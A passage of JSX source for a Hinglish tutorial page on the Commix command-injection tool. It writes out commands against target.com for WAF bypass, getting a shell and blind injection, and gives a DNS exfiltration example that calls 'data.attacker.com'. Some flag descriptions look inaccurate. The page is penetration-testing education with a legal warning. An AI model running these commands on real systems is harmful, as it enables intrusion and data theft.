    print(f"Parameter: {vuln['parameter']}")
    print(f"Technique: {vuln['technique']}")
    print(f"Payload: {vuln['payload']}")
    print("---")

# CSV report banao:
import csv
with open('report.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['URL', 'Parameter', 'Technique', 'Severity'])
    for vuln in data.get('vulnerabilities', []):
        writer.writerow([
            vuln['url'],
            vuln['parameter'],
            vuln['technique'],
            'Critical'
        ])`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Kya Commix free hai?', a: 'Haan, puri tarah free aur open source (GPLv3 license). GitHub par available hai.' },
          { q: 'SQLmap aur Commix mein kya fark hai?', a: 'SQLmap SQL injection ke liye hai, Commix OS command injection ke liye. Dono ka interface similar hai.' },
          { q: 'Blind command injection detect kaise kare?', a: 'Time-based technique use karo. Response delay measure karo. File-based technique bhi try karo.' },
          { q: 'WAF bypass kaise kare?', a: 'Tamper scripts use karo — space2comment, randomcase, base64. Multiple scripts combine karo.' },
          { q: 'Kya Windows servers par kaam karta hai?', a: 'Haan, Windows aur Linux dono par. OS automatically detect hota hai.' },
          { q: 'Kitne parameters test kar sakta hai?', a: 'Unlimited — GET, POST, cookie, headers sabhi automatically test hote hain.' },
          { q: 'False positives kaise handle kare?', a: 'Manual verification zaruri hai. Multiple techniques se confirm karo. Output carefully analyze karo.' },
          { q: 'Production environment mein test kar sakte hain?', a: 'Sirf written permission ke saath. Pehle lab mein practice karo. Rate limiting use karo.' },
          { q: 'Kya Commix JSON API injection support karta hai?', a: 'Haan, --header="Content-Type: application/json" aur --data flag se JSON data mein injection test kar sakte ho.' },
          { q: 'Reverse shell kaise milta hai?', a: '--shell flag use karo ya manual payloads inject karo. Listener pehle start karo attacker machine par.' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Performance Tuning</h2>
      <p>
        Commix की scanning speed और accuracy को optimize करने के लिए कई techniques हैं। Large-scale testing mein performance tuning bahut important hai — time bachata hai aur target server par load bhi kam padta hai.
      </p>
      <CodeBlock
        title="Speed Optimization"
        code={`# Batch mode — user interaction skip:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --batch

# Specific technique only — sab try mat karo:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --technique=classic

# Skip specific tests:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --skip=tor

# Threads increase karo:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --threads=10

# Timeout reduce karo (fast network):
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --timeout=5

# Skip logo display:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --skip-traffic

# Multiple URLs with xargs:
cat targets.txt | xargs -P 5 -I {} python3 commix.py --url="{}" --batch`}
      />
      <CodeBlock
        title="Reducing Target Load"
        code={`# Delay between requests:
python3 commix.py --url="http://target.com/vuln.php" --delay=2

# Random delay (0-5 seconds):
python3 commix.py --url="http://target.com/vuln.php" --delay=5

# Specific parameter only:
python3 commix.py --url="http://target.com/vuln.php" --skip="cookie,header"

# Safe mode — no destructive payloads:
python3 commix.py --url="http://target.com/vuln.php" --skip="dos"

# Crawl depth limit:
python3 commix.py --url="http://target.com/" --crawl=2

# Request rate limiting:
python3 commix.py --url="http://target.com/vuln.php" --rate-limit=10`}
      />

      <h2>Blind Injection Deep Dive</h2>
      <p>
        Blind command injection tab hota hai jab server koi visible output nahi deta. Commix time-based aur file-based techniques se blind injection detect aur exploit kar sakta hai. Yeh technique tab kaam aati hai jab error messages suppress kiye gaye hon ya output page par reflect nahi hota.
      </p>
      <CodeBlock
        title="Time-Based Blind Injection"
        code={`# Time-based blind injection — response delay se detect:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --technique=time-based

# Custom delay (default 1 second):
python3 commix.py --url="http://target.com/vuln.php?cmd=id" \\
  --technique=time-based --time-sec=5

# Commix automatically time difference measure karta hai:
# Normal response: 0.2 seconds
# Injected response: 5.2 seconds (command: sleep 5)
# Difference = 5 seconds = injection confirmed

# Blind data extraction (time-based):
# Commix binary search technique use karta hai
# Character by character data extract karta hai
# Example: username length find karo, phir har character find karo`}
      />
      <CodeBlock
        title="File-Based Blind Injection"
        code={`# File-based blind injection — file write/read se confirm:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --technique=file-based

# Commix /tmp mein file write karta hai, phir read karke confirm karta hai
# Step 1: echo "test" > /tmp/commix_test.txt
# Step 2: cat /tmp/commix_test.txt
# Step 3: If response contains "test" = injection confirmed

# Custom temp directory:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" \\
  --technique=file-based --tmp-path="/var/tmp"

# DNS exfiltration technique:
# Data ko DNS query ke through bahar bhejo
# Command: nslookup data.attacker.com
# Attacker DNS server par data receive hota hai`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Commix ke results ko analyze karna aur report banana penetration testing ka important part hai. Structured output se vulnerability details easily extract ho jati hain.
      </p>
      <CodeBlock
        title="Output Formats and Analysis"
        code={`# Text output directory mein save:
python3 commix.py --url="http://target.com/vuln.php?cmd=id" \\
  --output-dir="/tmp/commix_report"

# JSON output (structured data):
python3 commix.py --url="http://target.com/vuln.php?cmd=id" \\
  --output-json="/tmp/commix.json"

# Output file analysis:
cat /tmp/commix_report/output.txt

# JSON parsing with Python:
python3 -c "
import json
with open('/tmp/commix.json') as f:
    data = json.load(f)
for vuln in data.get('vulnerabilities', []):
    print(f'Type: {vuln[\"type\"]}')
    print(f'Parameter: {vuln[\"parameter\"]}')
    print('---')
"

# CSV export for spreadsheet:
python3 -c "
import json, csv
with open('/tmp/commix.json') as f:
    data = json.load(f)
with open('report.csv', 'w', newline='') as c:
    writer = csv.writer(c)
    writer.writerow(['URL', 'Parameter', 'Technique', 'Payload'])
    for v in data.get('vulnerabilities', []):
        writer.writerow([v.get('url'), v.get('parameter'), v.get('technique'), v.get('payload')])
"`}
      />

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SQLmap</td><td className="py-2 px-3">SQL Injection automation</td><td className="py-2 px-3">100+ DBMS support, best in class</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Commix</td><td className="py-2 px-3">Command Injection automation</td><td className="py-2 px-3">OS command injection focused</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">NoSQLmap</td><td className="py-2 px-3">NoSQL Injection</td><td className="py-2 px-3">MongoDB, CouchDB targeting</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">XSStrike</td><td className="py-2 px-3">XSS detection</td><td className="py-2 px-3">Advanced XSS fuzzing</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">DSSS</td><td className="py-2 px-3">SQL Injection scanner</td><td className="py-2 px-3">Lightweight, Python-based</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Sqlninja</td><td className="py-2 px-3">MS SQL exploitation</td><td className="py-2 px-3">xp_cmdshell focused</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">jSQL Injection</td><td className="py-2 px-3">Java-based SQL injection</td><td className="py-2 px-3">Cross-platform GUI</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">BBQSQL</td><td className="py-2 px-3">Blind SQL injection</td><td className="py-2 px-3">High-speed blind exploitation</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        Command injection real-world applications mein bahut common hai — web applications, IoT devices, aur embedded systems mein milta hai. Commix jaise tools se automated detection possible hai.
      </p>
      <p>
        Ek bug bounty program mein researcher ne Commix use karke ek e-commerce website mein command injection find kiya. Website ka image resize feature user input ko directly ImageMagick command mein pass kar raha tha. Commix ne blind injection detect kiya time-based technique se. Report submit karne par $5,000 ka bounty milta tha. Remediation thi — input validation aur parameterized commands use karna.
      </p>
      <p>
        Ek penetration test mein Commix ne ek admin panel mein command injection find kiya jo ping functionality mein tha. Admin panel sirf internal network se accessible tha lekin ek SSRF vulnerability se pehle access mil gaya. Commix ne 3 different injection techniques identify ki — semicolon, pipe, aur backtick. Reverse shell lekar tester ne full server compromise kar liya. Client ko report mein detailed remediation steps diye gaye — input sanitization, WAF deployment, aur code review.
      </p>
      <p>
        IoT devices mein command injection bahut common hai — router firmware, IP cameras, aur smart home devices mein milta hai. Ek security audit mein Commix use karke 50+ IoT devices mein command injection find kiya gaya. Sabse common vulnerable feature tha diagnostic ping tool — user input directly system command mein pass hota tha. Manufacturers ko responsible disclosure karke patches release karwaye gaye.
      </p>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Hamesha manual testing pehle karo — Commix automated hai lekin manual verification zaruri hai</li>
          <li>Tamper scripts combine karo — single tamper bypass nahi kar pata toh multiple try karo</li>
          <li>Blind injection mein patience rakho — time-based detection slow ho sakti hai</li>
          <li>Proxy use karo (Burp Suite) — traffic analyze karne mein madad milegi</li>
          <li>Output save karo — report banane mein kaam aayega</li>
          <li>Different HTTP methods try karo — GET, POST, PUT, DELETE sabhi test karo</li>
          <li>Rate limiting respect karo — production servers ko overload mat karo</li>
          <li>Regular updates karo — naye injection techniques add hote rahte hain</li>
          <li>JSON aur XML APIs bhi test karo — modern applications mein common hai</li>
          <li>Reverse shell ke liye pehle listener start karo — phir payload inject karo</li>
          <li>Burp Suite request file se direct test kar sakte ho — -r flag use karo</li>
          <li>Custom tamper scripts banao specific WAF ke liye — built-in se zyada effective hote hain</li>
        </ul>
      </div>

      <h2>Commix Workflow Summary</h2>
      <p>
        Penetration testing mein Commix ka step-by-step workflow samajhna important hai. Pehle target enumerate karo, phir injection points identify karo, aur finally exploitation karo. Har step mein proper documentation zaruri hai — output save karo aur findings note karo.
      </p>
      <CodeBlock
        title="Complete Commix Workflow"
        code={`# Step 1: Target reconnaissance
nmap -sV -sC target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Step 2: Identify potential injection points
# Forms, URL parameters, cookies, headers sab check karo

# Step 3: Commix automated scan
python3 commix.py --url="http://target.com/vuln.php?cmd=id" -v 3 --batch

# Step 4: Try different techniques
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --technique=classic
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --technique=time-based

# Step 5: WAF bypass (if blocked)
python3 commix.py --url="http://target.com/vuln.php" --tamper=space2comment,randomcase

# Step 6: Get shell
python3 commix.py --url="http://target.com/vuln.php?cmd=id" --shell

# Step 7: Post-exploitation and documentation
# Save all outputs for report
# Generate CSV report for team review
# Document all findings with screenshots
# Remediation recommendations likho
# Client ko present karo with risk ratings
# Retest after remediation
# Final report sign-off`}
      />

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Commix एक powerful command injection exploitation tool है। इसका इस्तेमाल केवल authorized security testing और research के लिए करें। बिना अनुमति के command injection exploitation illegal है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized system access अपराध है — जुर्माना और जेल दोनों हो सकते हैं। केवल अपने lab या written authorization के साथ ही use करें। Responsible disclosure follow करें।
      </div>

      <div className="info-box mt-6">
        <strong>📚 Additional Resources:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Official GitHub: github.com/commixproject/commix</li>
          <li>OWASP Command Injection Guide</li>
          <li>PortSwigger Web Security Academy — OS Command Injection labs</li>
        </ul>
      </div>
    </TutorialLayout>
  )
}
